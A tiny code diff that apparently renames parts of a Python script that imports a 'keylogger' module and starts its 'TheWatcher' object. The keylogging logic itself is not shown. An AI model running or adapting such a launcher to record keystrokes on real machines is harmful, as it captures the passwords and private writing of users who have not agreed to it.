@@ -1,4 +1,4 @@
 import keylogger
 
-the_Watcher = keylogger.TheWatcher()
-the_Watcher.start() 
+keylog = keylogger.TheWatcher()
+keylog.startWatcher() 
